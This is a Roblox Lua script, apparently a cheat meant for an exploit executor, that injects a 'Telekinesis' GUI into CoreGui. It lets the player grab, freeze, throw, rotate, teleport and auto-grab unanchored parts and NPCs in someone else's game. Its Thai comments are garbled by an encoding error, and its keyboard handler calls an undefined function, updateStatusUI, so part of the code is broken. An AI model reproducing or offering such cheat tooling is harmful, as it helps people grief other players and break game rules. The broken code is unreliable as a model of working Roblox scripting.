local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")

local LP = Players.LocalPlayer
local Cam = workspace.CurrentCamera
local Mouse = LP:GetMouse()

local UI_SCALE = 1/1.4
local AUTO_RADIUS = 30 -- ‡∏£‡∏∞‡∏¢‡∏∞‡∏Ç‡∏≠‡∏á‡∏£‡∏∞‡∏ö‡∏ö Auto
local MOVE_SNAP = 1
local ROT_SNAP = 15

local holdDistance = 20
local throwForce = 200

local grabbed = {}
local frozen = { }
local selected = {}
local highlights = {}
local handles = {}

local autoGrabNPC = false
local autoGrabPart = false
local autoFreeze = false
local autoThrow = false
local highlightOn = true

local currentTool = "NONE"

local initialCFrames = {}
local initialPositions = {}

-- ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏ß‡πà‡∏≤‡πÄ‡∏õ‡πá‡∏ô‡∏Ñ‡∏ô‡πÄ‡∏•‡πà‡∏ô‡∏´‡∏£‡∏∑‡∏≠‡∏ï‡∏±‡∏ß‡πÄ‡∏£‡∏≤‡πÄ‡∏≠‡∏á‡πÑ‡∏´‡∏°
local function isPlayer(obj)
    if not obj then return false end
    local model = obj:FindFirstAncestorOfClass("Model")
    if model then
        if Players:GetPlayerFromCharacter(model) then
            return true
        end
        -- ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏ä‡∏∑‡πà‡∏≠‡∏ï‡∏±‡∏ß‡∏•‡∏∞‡∏Ñ‡∏£ (‡∏Å‡∏£‡∏ì‡∏µ‡∏ú‡∏π‡πâ‡∏£‡∏±‡∏ô‡∏™‡∏Ñ‡∏£‡∏¥‡∏õ‡∏ï‡πå)
        if model.Name == LP.Name then return true end
    end
    return false
end

-- ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö Part (‡πÑ‡∏°‡πà Anchored ‡πÅ‡∏•‡∏∞‡πÑ‡∏°‡πà‡πÉ‡∏ä‡πà‡∏ú‡∏π‡πâ‡πÄ‡∏•‡πà‡∏ô)
local function isValidPart(p)
    if not p or not p:IsA("BasePart") then return false end
    if p.Anchored then return false end 
    if isPlayer(p) then return false end
    return true
end

-- GUI Setup
local gui = Instance.new("ScreenGui")
pcall(function() gui.Parent = CoreGui end)
if gui.Parent ~= CoreGui then gui.Parent = LP.PlayerGui end
gui.Name = "TelekinesisUI_F3X_Pro"
gui.ResetOnSpawn = false
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local cross = Instance.new("Frame", gui)
cross.Size = UDim2.fromOffset(6,6)
cross.Position = UDim2.fromScale(0.5,0.5)
cross.AnchorPoint = Vector2.new(0.5,0.5)
cross.BackgroundColor3 = Color3.new(1,1,1)
Instance.new("UICorner",cross).CornerRadius = UDim.new(1,0)

local targetHL = Instance.new("Highlight", gui)
targetHL.FillTransparency = 0.6
targetHL.OutlineColor = Color3.fromRGB(255,255,255)

local main = Instance.new("Frame", gui)
main.Size = UDim2.fromScale(0.32*UI_SCALE, 0.75*UI_SCALE)
main.Position = UDim2.fromScale(0.03, 0.18)
main.BackgroundColor3 = Color3.fromRGB(20,20,20)
main.Active = true
main.Draggable = true
Instance.new("UICorner",main).CornerRadius = UDim.new(0,14)

local title = Instance.new("TextLabel", main)
title.Size = UDim2.new(1,0,0,32)
title.Text = "TELEKINESIS UI 1.6"
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.TextColor3 = Color3.new(1,1,1)
title.BackgroundTransparency = 1

local pages = {}
local function createPage()
    local f = Instance.new("ScrollingFrame", main)
    f.Position = UDim2.new(0.03,0,0,36)
    f.Size = UDim2.new(0.94,0,1,-45)
    f.ScrollBarThickness = 4
    f.Visible = false
    f.BackgroundColor3 = Color3.fromRGB(30,30,30)
    f.BorderSizePixel = 0
    local layout = Instance.new("UIListLayout", f)
    layout.Padding = UDim.new(0,5)
    layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
        f.CanvasSize = UDim2.new(0,0,0,layout.AbsoluteContentSize.Y+10)
    end)
    return f
end

pages.main = createPage()
pages.move = createPage()

local function showPage(name)
    for k,v in pairs(pages) do v.Visible = (k == name) end
end
showPage("main")

-- Logic Functions
local function getTarget()
    local rp = RaycastParams.new()
    rp.FilterType = Enum.RaycastFilterType.Exclude
    rp.FilterDescendantsInstances = {LP.Character, Cam}
    local r = workspace:Raycast(Cam.CFrame.Position, Cam.CFrame.LookVector * 500, rp)
    if r and r.Instance and isValidPart(r.Instance) then return r.Instance end
    return nil
end

local function grabPart(p)
    if not isValidPart(p) or grabbed[p] then return end
    local bp = Instance.new("BodyPosition", p)
    bp.MaxForce = Vector3.new(1e6,1e6,1e6)
    bp.P = 10000
    bp.Position = p.Position
    local bg = Instance.new("BodyGyro", p)
    bg.MaxTorque = Vector3.new(1e6,1e6,1e6)
    bg.P = 10000
    bg.CFrame = p.CFrame
    grabbed[p] = {bp = bp, bg = bg}
    
    if autoFreeze then frozen[p] = true end
    if autoThrow then
        task.wait(0.1)
        p.AssemblyLinearVelocity = Cam.CFrame.LookVector * throwForce
        bp:Destroy() bg:Destroy() grabbed[p] = nil
    end
end

local function clearAllHandles()
    for p, hSet in pairs(handles) do
        if hSet.move then hSet.move:Destroy() end
        if hSet.rot then hSet.rot:Destroy() end
    end
    handles = {}
end

local function createHandles(p)
    clearAllHandles()
    if not p or not isValidPart(p) then return end
    
    local mh = Instance.new("Handles", gui)
    mh.Adornee = p
    mh.Style = Enum.HandlesStyle.Resize
    mh.Color3 = Color3.fromRGB(255,255,100)
    mh.Visible = (currentTool == "MOVE")

    local ah = Instance.new("ArcHandles", gui)
    ah.Adornee = p
    ah.Parent = gui
    ah.Visible = (currentTool == "ROTATE")

    mh.MouseButton1Down:Connect(function()
        initialPositions = {}
        for part in pairs(selected) do if grabbed[part] then initialPositions[part] = grabbed[part].bp.Position end end
    end)

    mh.MouseDrag:Connect(function(face, dist)
        local axisVec = Vector3.FromNormalId(face)
        local snappedDist = math.round(dist / MOVE_SNAP) * MOVE_SNAP
        for part in pairs(selected) do
            if grabbed[part] and initialPositions[part] then
                grabbed[part].bp.Position = initialPositions[part] + (p.CFrame:VectorToWorldSpace(axisVec) * snappedDist)
            end
        end
    end)

    ah.MouseButton1Down:Connect(function()
        initialCFrames = {}
        for part in pairs(selected) do if grabbed[part] then initialCFrames[part] = grabbed[part].bg.CFrame end end
    end)

    ah.MouseDrag:Connect(function(axis, angle)
        local snappedDeg = math.round(math.deg(angle) / ROT_SNAP) * ROT_SNAP
        local rotationCFrame = CFrame.fromAxisAngle(Vector3.FromAxis(axis), math.rad(snappedDeg))
        for part in pairs(selected) do
            if grabbed[part] and initialCFrames[part] then
                grabbed[part].bg.CFrame = initialCFrames[p] * rotationCFrame * (initialCFrames[p]:Inverse() * initialCFrames[part])
            end
        end
    end)
    handles[p] = {move = mh, rot = ah}
end

local function setHighlight(p, state)
    if state then
        if not highlights[p] and isValidPart(p) then
            local hl = Instance.new("Highlight", gui)
            hl.Adornee = p
            hl.FillTransparency = 0.4
            hl.OutlineColor = Color3.fromRGB(255,255,0)
            highlights[p] = hl
        end
    else
        if highlights[p] then highlights[p]:Destroy() highlights[p] = nil end
    end
end

-- UI Component Helpers
local function btn(page, text, cb)
    local b = Instance.new("TextButton", page)
    b.Size = UDim2.new(1,0,0,28)
    b.Text = text
    b.Font = Enum.Font.Gotham
    b.TextSize = 12
    b.TextColor3 = Color3.new(1,1,1)
    b.BackgroundColor3 = Color3.fromRGB(70,70,70)
    Instance.new("UICorner",b)
    b.MouseButton1Click:Connect(function() cb(b) end)
    return b
end

local function label(page, text)
    local l = Instance.new("TextLabel", page)
    l.Size = UDim2.new(1,0,0,20)
    l.BackgroundTransparency = 1
    l.Text = text
    l.Font = Enum.Font.GothamBold
    l.TextColor3 = Color3.fromRGB(150,150,150)
    l.TextSize = 11
    return l
end

-- PAGE 1: MAIN
btn(pages.main, "GRAB (LOOK)", function() grabPart(getTarget()) end)
btn(pages.main, "DROP (LOOK)", function()
    local t=getTarget()
    if t and grabbed[t] then
        grabbed[t].bp:Destroy() grabbed[t].bg:Destroy()
        grabbed[t]=nil frozen[t]=nil selected[t]=nil
        setHighlight(t,false) clearAllHandles()
    end
end)
btn(pages.main, "DROP ALL", function()
    for p, objs in pairs(grabbed) do objs.bp:Destroy() objs.bg:Destroy() end
    grabbed={} frozen={} selected={}
    for p in pairs(highlights) do setHighlight(p,false) end
    clearAllHandles()
end)
btn(pages.main, "FREEZE (LOOK)", function() local t=getTarget() if t and grabbed[t] then frozen[t]=true end end)
btn(pages.main, "UNFREEZE (LOOK)", function()
    local t=getTarget()
    if t then frozen[t]=nil setHighlight(t,false) end
end)
btn(pages.main, "UNFREEZE ALL", function() frozen={} selected={} for p in pairs(highlights) do setHighlight(p,false) end clearAllHandles() end)

label(pages.main, "--- AUTO SETTINGS ---")
btn(pages.main, "AUTO GRAB NPC : OFF", function(b) autoGrabNPC = not autoGrabNPC b.Text = "AUTO GRAB NPC : "..(autoGrabNPC and "ON" or "OFF") end)
btn(pages.main, "AUTO GRAB PART : OFF", function(b) autoGrabPart = not autoGrabPart b.Text = "AUTO GRAB PART : "..(autoGrabPart and "ON" or "OFF") end)
btn(pages.main, "AUTO FREEZE : OFF", function(b) autoFreeze = not autoFreeze b.Text = "AUTO FREEZE : "..(autoFreeze and "ON" or "OFF") end)
btn(pages.main, "AUTO THROW : OFF", function(b) autoThrow = not autoThrow b.Text = "AUTO THROW : "..(autoThrow and "ON" or "OFF") end)

label(pages.main, "--- ACTIONS ---")
btn(pages.main, "THROW (LOOK)", function()
    local t = getTarget()
    if t and grabbed[t] then
        t.AssemblyLinearVelocity = Cam.CFrame.LookVector * throwForce
        grabbed[t].bp:Destroy() grabbed[t].bg:Destroy()
        grabbed[t]=nil frozen[t]=nil setHighlight(t,false)
    end
end)

local distLabel = btn(pages.main, "DISTANCE : "..holdDistance, function() end)
btn(pages.main, "+ DIST", function() holdDistance+=5 distLabel.Text = "DISTANCE : "..holdDistance end)
btn(pages.main, "- DIST", function() holdDistance = math.max(1, holdDistance-5) distLabel.Text = "DISTANCE : "..holdDistance end)
btn(pages.main, "HIGHLIGHT : ON", function(b) highlightOn = not highlightOn b.Text = "HIGHLIGHT : "..(highlightOn and "ON" or "OFF") end)
btn(pages.main, "‚ñ∂ MOVE / ROTATE MODE", function() showPage("move") end)
btn(pages.main, "DESTROY UI", function() for p,o in pairs(grabbed) do o.bp:Destroy() o.bg:Destroy() end gui:Destroy() end)

-- PAGE 2: MOVE
local list = Instance.new("ScrollingFrame", pages.move)
list.Size = UDim2.new(1,0,0,120); list.BackgroundColor3 = Color3.fromRGB(35,35,35); list.BorderSizePixel = 0
local ll = Instance.new("UIListLayout", list); ll.Padding = UDim.new(0,4)

local function refreshList()
    for _,c in ipairs(list:GetChildren()) do if c:IsA("TextButton") then c:Destroy() end end
    for p in pairs(frozen) do
        if p and p.Parent then
            local b = btn(list, p.Name, function()
                selected[p] = not selected[p]
                setHighlight(p, selected[p])
                local last = nil; for part in pairs(selected) do last = part end
                if last then createHandles(last) else clearAllHandles() end
                refreshList()
            end)
            b.BackgroundColor3 = selected[p] and Color3.fromRGB(120,120,0) or Color3.fromRGB(70,70,70)
        end
    end
end

btn(pages.move, "REFRESH LIST", refreshList)
btn(pages.move, "SELECT ALL", function()
    local last = nil; for p in pairs(frozen) do selected[p] = true; setHighlight(p, true); last = p end
    if last then createHandles(last) end refreshList()
end)
btn(pages.move, "UNSELECT ALL", function() for p in pairs(selected) do setHighlight(p, false) end selected = {}; clearAllHandles(); refreshList() end)

label(pages.move, "--- TOOLS (MULTI-EDIT) ---")
local toolBtn = btn(pages.move, "CURRENT TOOL: NONE", function(b)
    if currentTool == "NONE" then currentTool = "MOVE" elseif currentTool == "MOVE" then currentTool = "ROTATE" else currentTool = "NONE" end
    b.Text = "CURRENT TOOL: "..currentTool
    local last = nil; for p in pairs(selected) do last = p end
    if last then createHandles(last) end
end)

label(pages.move, "--- SETTINGS ---")
btn(pages.move, "MOVE STEP (SNAP): "..MOVE_SNAP, function(b)
    if MOVE_SNAP == 0.1 then MOVE_SNAP = 0.5 elseif MOVE_SNAP == 0.5 then MOVE_SNAP = 1 elseif MOVE_SNAP == 1 then MOVE_SNAP = 5 else MOVE_SNAP = 0.1 end
    b.Text = "MOVE STEP (SNAP): "..MOVE_SNAP
end)
btn(pages.move, "ROTATE STEP (SNAP): "..ROT_SNAP, function(b)
    if ROT_SNAP == 1 then ROT_SNAP = 15 elseif ROT_SNAP == 15 then ROT_SNAP = 45 elseif ROT_SNAP == 45 then ROT_SNAP = 90 else ROT_SNAP = 1 end
    b.Text = "ROTATE STEP (SNAP): "..ROT_SNAP
end)
btn(pages.move, "‚óÄ BACK", function() showPage("main") end)

-- Loop ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏£‡∏∞‡∏ö‡∏ö Auto ‡πÅ‡∏•‡∏∞‡∏Å‡∏≤‡∏£‡∏õ‡∏£‡∏∞‡∏°‡∏ß‡∏•‡∏ú‡∏•
RunService.RenderStepped:Connect(function()
    targetHL.Adornee = highlightOn and getTarget() or nil
    
    -- Auto Logic
    if autoGrabPart or autoGrabNPC then
        for _, p in pairs(workspace:GetPartBoundsInRadius(LP.Character.PrimaryPart.Position, AUTO_RADIUS)) do
            if isValidPart(p) and not grabbed[p] then
                local isNPC = p:FindFirstAncestorOfClass("Model") and p:FindFirstAncestorOfClass("Model"):FindFirstChild("Humanoid")
                if (autoGrabNPC and isNPC) or (autoGrabPart and not isNPC) then
                    grabPart(p)
                end
            end
        end
    end

    -- Update Position ‡∏Ç‡∏≠‡∏á‡∏Ç‡∏≠‡∏á‡∏ó‡∏µ‡πà‡∏ñ‡∏∑‡∏≠
    for p, objs in pairs(grabbed) do
        if not p or not p.Parent or p.Anchored then
            if objs.bp then objs.bp:Destroy() end
            if objs.bg then objs.bg:Destroy() end
            grabbed[p] = nil; frozen[p] = nil; setHighlight(p, false)
        elseif not frozen[p] then
            objs.bp.Position = Cam.CFrame.Position + Cam.CFrame.LookVector * holdDistance
            objs.bg.CFrame = p.CFrame
        end
    end
end)

-- Minimize Button
local toggleBtn = Instance.new("TextButton", gui)
toggleBtn.Size = UDim2.fromOffset(40, 40)
toggleBtn.Position = UDim2.new(0.03, 0, 0.18, -45)
toggleBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
toggleBtn.Text = "[-]"
toggleBtn.Font = Enum.Font.GothamBold
toggleBtn.TextColor3 = Color3.new(1, 1, 1)
toggleBtn.Draggable = true
Instance.new("UICorner", toggleBtn)

local isMinimized = false
toggleBtn.MouseButton1Click:Connect(function()
    isMinimized = not isMinimized
    main.Visible = not isMinimized
    toggleBtn.Text = isMinimized and "[+]" or "[-]"
end)
-- [[ ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏≠‡∏∏‡∏õ‡∏Å‡∏£‡∏ì‡πå‡πÅ‡∏•‡∏∞‡∏ï‡∏±‡πâ‡∏á‡∏Ñ‡πà‡∏≤‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏ï‡πâ‡∏ô ]] --
local UserInputService = game:GetService("UserInputService")
local isPC = not (UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled)

-- UI ‡∏ß‡∏¥‡∏ò‡∏µ‡πÉ‡∏ä‡πâ‡∏á‡∏≤‡∏ô‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏Ñ‡∏≠‡∏°‡∏û‡∏¥‡∏ß‡πÄ‡∏ï‡∏≠‡∏£‡πå (‡∏õ‡∏£‡∏±‡∏ö‡∏Ç‡∏ô‡∏≤‡∏î‡∏ï‡∏±‡∏ß‡∏´‡∏ô‡∏±‡∏á‡∏™‡∏∑‡∏≠‡πÉ‡∏´‡∏ç‡πà‡∏Ç‡∏∂‡πâ‡∏ô‡πÅ‡∏•‡∏∞‡∏•‡∏≤‡∏Å‡πÑ‡∏î‡πâ)
local helpUI = Instance.new("Frame", gui)
helpUI.Size = UDim2.fromOffset(280, 320) -- ‡∏Ç‡∏¢‡∏≤‡∏¢‡∏Ç‡∏ô‡∏≤‡∏î UI
helpUI.Position = UDim2.new(0.7, 0, 0.3, 0)
helpUI.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
helpUI.BackgroundTransparency = 0.2
helpUI.Visible = isPC
helpUI.Active = true
helpUI.Draggable = true
Instance.new("UICorner", helpUI).CornerRadius = UDim.new(0, 10)

local helpTitle = Instance.new("TextLabel", helpUI)
helpTitle.Size = UDim2.new(1, 0, 0, 40)
helpTitle.Text = "üíª PC CONTROLS"
helpTitle.TextColor3 = Color3.fromRGB(0, 255, 255)
helpTitle.BackgroundTransparency = 1
helpTitle.Font = Enum.Font.GothamBold
helpTitle.TextSize = 22 -- ‡∏Ç‡∏¢‡∏≤‡∏¢‡∏´‡∏±‡∏ß‡∏Ç‡πâ‡∏≠

local helpText = Instance.new("TextLabel", helpUI)
helpText.Size = UDim2.new(1, -20, 1, -50)
helpText.Position = UDim2.fromOffset(10, 50)
helpText.Text = "‚Ä¢ [G] : Grab Mode (L-Click)\n‚Ä¢ [F] : Freeze Mode (L-Click)\n‚Ä¢ [T] : Throw (T x2 = Auto)\n‚Ä¢ [N] : Unfreeze All\n\nüñ±Ô∏è MOUSE ACTIONS:\n‚Ä¢ L-Click: Grab/Freeze\n‚Ä¢ R-Click: Drop Part\n‚Ä¢ R-Click x2: Drop All\n\n‚ö†Ô∏è NOTE: Must turn OFF \nFreeze Mode to Drop parts!"
helpText.TextColor3 = Color3.new(1, 1, 1)
helpText.TextWrapped = true
helpText.TextYAlignment = Enum.TextYAlignment.Top
helpText.TextXAlignment = Enum.TextXAlignment.Left
helpText.BackgroundTransparency = 1
helpText.Font = Enum.Font.GothamMedium
helpText.TextSize = 18 -- ‡∏Ç‡∏¢‡∏≤‡∏¢‡πÄ‡∏ô‡∏∑‡πâ‡∏≠‡∏´‡∏≤‡πÉ‡∏´‡πâ‡πÉ‡∏´‡∏ç‡πà‡∏ä‡∏±‡∏î‡πÄ‡∏à‡∏ô
helpText.LineHeight = 1.2

-- ‡∏™‡∏ñ‡∏≤‡∏ô‡∏∞‡πÇ‡∏´‡∏°‡∏î
local grabModeActive = false
local freezeModeActive = false
local lastTClick = 0
local lastRClick = 0

-- ‡∏õ‡∏¥‡∏î Crosshair ‡∏ñ‡πâ‡∏≤‡πÄ‡∏õ‡πá‡∏ô‡∏Ñ‡∏≠‡∏° ‡πÄ‡∏û‡∏£‡∏≤‡∏∞‡πÄ‡∏£‡∏≤‡∏à‡∏∞‡πÉ‡∏ä‡πâ‡πÄ‡∏°‡∏≤‡∏™‡πå‡∏ä‡∏µ‡πâ‡πÅ‡∏ó‡∏ô
if isPC then cross.Visible = false end

-- [[ ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡πÄ‡∏õ‡πâ‡∏≤‡∏´‡∏°‡∏≤‡∏¢‡∏à‡∏≤‡∏Å‡∏ï‡∏≥‡πÅ‡∏´‡∏ô‡πà‡∏á‡πÄ‡∏°‡∏≤‡∏™‡πå (Mouse Raycast) ]] --
local function getMouseTarget()
    local mousePos = UserInputService:GetMouseLocation()
    local unitRay = Cam:ViewportPointToRay(mousePos.X, mousePos.Y)
    local rp = RaycastParams.new()
    rp.FilterType = Enum.RaycastFilterType.Exclude
    rp.FilterDescendantsInstances = {LP.Character, Cam}
    
    local r = workspace:Raycast(unitRay.Origin, unitRay.Direction * 1000, rp)
    if r and r.Instance and isValidPart(r.Instance) then 
        return r.Instance 
    end
    return nil
end

-- [[ ‡∏Å‡∏≤‡∏£‡∏Ñ‡∏ß‡∏ö‡∏Ñ‡∏∏‡∏°‡∏ú‡πà‡∏≤‡∏ô‡∏Ñ‡∏µ‡∏¢‡πå‡∏ö‡∏≠‡∏£‡πå‡∏î‡πÅ‡∏•‡∏∞‡πÄ‡∏°‡∏≤‡∏™‡πå ]] --
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed or not isPC then return end

    -- G: Toggle Grab Mode
    if input.KeyCode == Enum.KeyCode.G then
        grabModeActive = not grabModeActive
        freezeModeActive = false
        updateStatusUI() -- ‡∏ñ‡πâ‡∏≤‡∏°‡∏µ UI ‡∏ö‡∏≠‡∏Å‡∏™‡∏ñ‡∏≤‡∏ô‡∏∞
    
    -- F: Toggle Freeze Mode
    elseif input.KeyCode == Enum.KeyCode.F then
        freezeModeActive = not freezeModeActive
        grabModeActive = false
        updateStatusUI()

    -- N: Unfreeze All
    elseif input.KeyCode == Enum.KeyCode.N then
        frozen = {}
        for p in pairs(highlights) do setHighlight(p, false) end

    -- T: Throw & Auto Throw
    elseif input.KeyCode == Enum.KeyCode.T then
        local now = tick()
        if now - lastTClick < 0.3 then
            autoThrow = not autoThrow
        else
            for p, o in pairs(grabbed) do
                p.AssemblyLinearVelocity = Cam.CFrame.LookVector * throwForce
                o.bp:Destroy() o.bg:Destroy()
                grabbed[p] = nil
            end
        end
        lastTClick = now

    -- Mouse Button 1 (‡∏Ñ‡∏•‡∏¥‡∏Å‡∏ã‡πâ‡∏≤‡∏¢): Grab ‡∏´‡∏£‡∏∑‡∏≠ Freeze
    elseif input.UserInputType == Enum.UserInputType.MouseButton1 then
        local target = getMouseTarget()
        if target then
            if grabModeActive then
                grabPart(target)
            elseif freezeModeActive then
                grabPart(target)
                frozen[target] = true
                setHighlight(target, true)
                if highlights[target] then 
                    highlights[target].OutlineColor = Color3.fromRGB(0, 170, 255) 
                end
            end
        end

    -- Mouse Button 2 (‡∏Ñ‡∏•‡∏¥‡∏Å‡∏Ç‡∏ß‡∏≤): Drop
    elseif input.UserInputType == Enum.UserInputType.MouseButton2 then
        local now = tick()
        if now - lastRClick < 0.3 then -- Double Click Right
            for p, o in pairs(grabbed) do
                o.bp:Destroy() o.bg:Destroy()
                grabbed[p] = nil
            end
        else
            -- Single Click: ‡∏ï‡πâ‡∏≠‡∏á‡∏õ‡∏¥‡∏î Freeze Mode ‡∏Å‡πà‡∏≠‡∏ô‡∏ñ‡∏∂‡∏á‡∏à‡∏∞ Drop ‡πÑ‡∏î‡πâ‡∏ï‡∏≤‡∏°‡∏Å‡∏é
            if not freezeModeActive then
                local target = getMouseTarget()
                if target and grabbed[target] then
                    grabbed[target].bp:Destroy()
                    grabbed[target].bg:Destroy()
                    grabbed[target] = nil
                end
            end
        end
        lastRClick = now
    end
end)

-- [[ ‡∏•‡∏π‡∏õ‡∏õ‡∏£‡∏∞‡∏°‡∏ß‡∏•‡∏ú‡∏• (RenderStepped) ]] --
RunService.RenderStepped:Connect(function()
    if not isPC then return end

    -- 1. ‡∏£‡∏∞‡∏ö‡∏ö Highlight ‡∏ï‡∏≤‡∏°‡πÄ‡∏°‡∏≤‡∏™‡πå (‡πÄ‡∏°‡∏≤‡∏™‡πå‡∏ä‡∏µ‡πâ‡πÑ‡∏õ‡∏ó‡∏µ‡πà‡πÑ‡∏´‡∏ô Highlight ‡∏Ç‡∏∂‡πâ‡∏ô‡∏ó‡∏µ‡πà‡∏ô‡∏±‡πà‡∏ô)
    local targetUnderMouse = getMouseTarget()
    if targetUnderMouse then
        targetHL.Adornee = targetUnderMouse
        if grabModeActive then
            targetHL.OutlineColor = Color3.fromRGB(0, 255, 0) -- ‡∏™‡∏µ‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ß‡πÇ‡∏´‡∏°‡∏î Grab
        elseif freezeModeActive then
            targetHL.OutlineColor = Color3.fromRGB(0, 170, 255) -- ‡∏™‡∏µ‡∏ü‡πâ‡∏≤‡πÇ‡∏´‡∏°‡∏î Freeze
        else
            targetHL.OutlineColor = Color3.new(1, 1, 1) -- ‡∏™‡∏µ‡∏Ç‡∏≤‡∏ß‡∏õ‡∏Å‡∏ï‡∏¥
        end
    else
        targetHL.Adornee = nil
    end

    -- 2. ‡∏£‡∏∞‡∏ö‡∏ö‡∏Å‡∏≤‡∏£‡πÄ‡∏Ñ‡∏•‡∏∑‡πà‡∏≠‡∏ô‡∏ó‡∏µ‡πà‡∏Ç‡∏≠‡∏á Part (‡∏ï‡∏≤‡∏°‡∏ï‡∏≥‡πÅ‡∏´‡∏ô‡πà‡∏á‡πÄ‡∏°‡∏≤‡∏™‡πå ‡πÑ‡∏°‡πà‡πÉ‡∏ä‡πà‡∏ï‡∏≤‡∏°‡∏Å‡∏≤‡∏£‡∏´‡∏°‡∏∏‡∏ô‡∏´‡∏ô‡πâ‡∏≤‡∏à‡∏≠)
    for p, objs in pairs(grabbed) do
        if not frozen[p] then
            local mousePos = UserInputService:GetMouseLocation()
            local unitRay = Cam:ViewportPointToRay(mousePos.X, mousePos.Y)
            
            -- ‡∏Ñ‡∏≥‡∏ô‡∏ß‡∏ì‡∏à‡∏∏‡∏î‡πÉ‡∏ô‡πÇ‡∏•‡∏Å 3D ‡∏ï‡∏≤‡∏°‡∏£‡∏∞‡∏¢‡∏∞‡∏´‡πà‡∏≤‡∏á (holdDistance) ‡∏à‡∏≤‡∏Å‡πÄ‡∏°‡∏≤‡∏™‡πå
            local targetPosition = unitRay.Origin + (unitRay.Direction * holdDistance)
            
            objs.bp.Position = targetPosition
            objs.bg.CFrame = p.CFrame -- ‡∏£‡∏±‡∏Å‡∏©‡∏≤‡∏™‡∏≠‡∏á‡∏ó‡∏¥‡∏®‡∏ó‡∏≤‡∏á‡πÄ‡∏î‡∏¥‡∏°
        end
    end
end)
-- [[ ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡∏ß‡∏≤‡∏£‡πå‡∏õ Part ‡∏ó‡∏µ‡πà‡πÄ‡∏•‡∏∑‡∏≠‡∏Å‡∏°‡∏≤‡πÑ‡∏ß‡πâ‡∏ï‡∏£‡∏á‡∏´‡∏ô‡πâ‡∏≤‡∏ú‡∏π‡πâ‡πÄ‡∏•‡πà‡∏ô ]] --
local function teleportSelectedToFront()
    local char = LP.Character
    if not char or not char:FindFirstChild("HumanoidRootPart") then return end
    
    -- ‡∏Ñ‡∏≥‡∏ô‡∏ß‡∏ì‡∏ï‡∏≥‡πÅ‡∏´‡∏ô‡πà‡∏á: ‡πÄ‡∏≠‡∏≤‡∏ï‡∏≥‡πÅ‡∏´‡∏ô‡πà‡∏á‡∏ï‡∏±‡∏ß‡∏•‡∏∞‡∏Ñ‡∏£ + (‡∏ó‡∏¥‡∏®‡∏ó‡∏≤‡∏á‡∏ó‡∏µ‡πà‡∏´‡∏±‡∏ô‡∏´‡∏ô‡πâ‡∏≤‡πÑ‡∏õ * ‡∏£‡∏∞‡∏¢‡∏∞‡∏´‡πà‡∏≤‡∏á 7 ‡∏´‡∏ô‡πà‡∏ß‡∏¢)
    local rootCF = char.HumanoidRootPart.CFrame
    local spawnPos = rootCF.Position + (rootCF.LookVector * 7) 
    
    for part in pairs(selected) do
        if part and part.Parent and not part.Anchored then
            -- ‡∏ñ‡πâ‡∏≤‡∏Å‡∏≥‡∏•‡∏±‡∏á Grab ‡∏≠‡∏¢‡∏π‡πà ‡πÉ‡∏´‡πâ‡∏¢‡πâ‡∏≤‡∏¢ BodyPosition ‡πÑ‡∏õ‡∏ó‡∏µ‡πà‡∏à‡∏∏‡∏î‡∏ô‡∏±‡πâ‡∏ô
            if grabbed[part] then
                grabbed[part].bp.Position = spawnPos
                grabbed[part].bg.CFrame = rootCF -- ‡∏õ‡∏£‡∏±‡∏ö‡∏≠‡∏á‡∏®‡∏≤‡πÉ‡∏´‡πâ‡∏´‡∏±‡∏ô‡∏ï‡∏≤‡∏°‡∏ï‡∏±‡∏ß‡∏•‡∏∞‡∏Ñ‡∏£‡∏î‡πâ‡∏ß‡∏¢ (‡∏ñ‡πâ‡∏≤‡∏ï‡πâ‡∏≠‡∏á‡∏Å‡∏≤‡∏£)
            else
                -- ‡∏ñ‡πâ‡∏≤‡πÑ‡∏°‡πà‡πÑ‡∏î‡πâ Grab ‡πÉ‡∏´‡πâ‡∏ß‡∏≤‡∏£‡πå‡∏õ CFrame ‡πÑ‡∏õ‡πÄ‡∏•‡∏¢
                part.CFrame = CFrame.new(spawnPos)
            end
        end
    end
end

-- [[ ‡πÄ‡∏û‡∏¥‡πà‡∏°‡∏õ‡∏∏‡πà‡∏°‡πÄ‡∏Ç‡πâ‡∏≤‡∏´‡∏ô‡πâ‡∏≤ Move Mode ]] --
if pages and pages.move then
    label(pages.move, "--- POSITIONING ---")
    local tpFrontBtn = btn(pages.move, "TELEPORT PART(SELECT FIRST)", function()
        teleportSelectedToFront()
    end)
    
    -- ‡∏õ‡∏£‡∏±‡∏ö‡∏™‡∏µ‡∏õ‡∏∏‡πà‡∏°‡πÉ‡∏´‡πâ‡∏î‡∏π‡∏ï‡πà‡∏≤‡∏á‡∏à‡∏≤‡∏Å‡∏õ‡∏∏‡πà‡∏°‡∏≠‡∏∑‡πà‡∏ô (‡∏™‡∏µ‡∏°‡πà‡∏ß‡∏á/‡∏ô‡πâ‡∏≥‡πÄ‡∏á‡∏¥‡∏ô)
    tpFrontBtn.BackgroundColor3 = Color3.fromRGB(80, 50, 200)
    tpFrontBtn.Font = Enum.Font.GothamBold
end
